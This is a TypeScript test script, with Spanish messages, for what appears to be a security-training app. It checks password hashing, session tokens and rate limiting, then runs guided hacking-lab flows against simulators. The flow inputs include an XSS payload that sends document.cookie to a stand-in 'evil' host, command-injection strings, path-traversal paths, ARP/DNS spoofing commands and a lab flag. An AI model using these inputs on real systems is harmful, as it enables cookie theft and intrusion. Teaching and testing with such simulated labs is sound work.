import { hashPassword, verifyPassword } from "../src/lib/password.ts";
import { signSession, verifySession } from "../src/lib/session.ts";
import { rateLimit } from "../src/lib/ratelimit.ts";
import { ENGINE_GUIDED } from "../src/lib/content/guided-engine.ts";
import { runEngine, type Mem } from "../src/lib/simulators/index.ts";

let ok = true;
const assert = (c: boolean, m: string) => {
  if (!c) ok = false;
  console.log(`${c ? "PASS" : "FAIL"}  ${m}`);
};

// password
const h = hashPassword("correct horse battery");
assert(h.startsWith("scrypt$"), "hash con esquema scrypt");
assert(verifyPassword("correct horse battery", h), "verifica la contraseña correcta");
assert(!verifyPassword("wrong", h), "rechaza la contraseña incorrecta");
assert(hashPassword("x") !== hashPassword("x"), "sal distinta por hash (no determinista)");

// session
const tok = signSession("user_123");
assert(verifySession(tok) === "user_123", "sesión firmada válida devuelve el userId");
assert(verifySession(tok.slice(0, -2) + "zz") === null, "sesión con firma manipulada rechazada");
assert(verifySession(undefined) === null, "sin token → null");
assert(verifySession("basura") === null, "token malformado → null");

// ratelimit
const key = "test:1.2.3.4";
const r = [1, 2, 3, 4].map(() => rateLimit(key, 3, 1000).ok);
assert(r[0] && r[1] && r[2] && !r[3], "rate limit: 3 permitidas, la 4ª bloqueada");

// guided engine flows
const flows: Record<string, string[]> = {
  "xss-guided": [
    "payload hola-mundo",
    "payload <script>alert(1)</script>",
    "payload <img src=x onerror=\"new Image().src='//evil/?c='+document.cookie\">"
  ],
  "cmdi-guided": ["ping 127.0.0.1", "ping 127.0.0.1; whoami", "ping 127.0.0.1; cat flag.txt"],
  "hijack-guided": ["sniff", "replay d4e5f6a1b2"],
  "traversal-guided": ["get avatar.png", "get ../config.txt", "get ../../../etc/app/secret.conf"],
  "spoofing-guided": ["arpspoof 192.168.1.24 192.168.1.1", "dnsspoof bank.local", "harvest"],
  "crypto-guided": ["cipher", "b64 TUhCe2NyMXB0MF9ndTE0ZDB9"]
};

for (const lab of ENGINE_GUIDED) {
  const mem: Mem = {};
  let index = 0;
  for (const input of flows[lab.slug]) {
    const res = runEngine(lab.engine, input, lab.params, mem);
    if (lab.steps[index]?.match(input, res.solved)) index++;
  }
  assert(index === lab.steps.length, `guiado ${lab.slug} se completa (${index}/${lab.steps.length})`);
}

console.log(ok ? "\nALL GREEN" : "\nFAILURES PRESENT");
process.exit(ok ? 0 : 1);
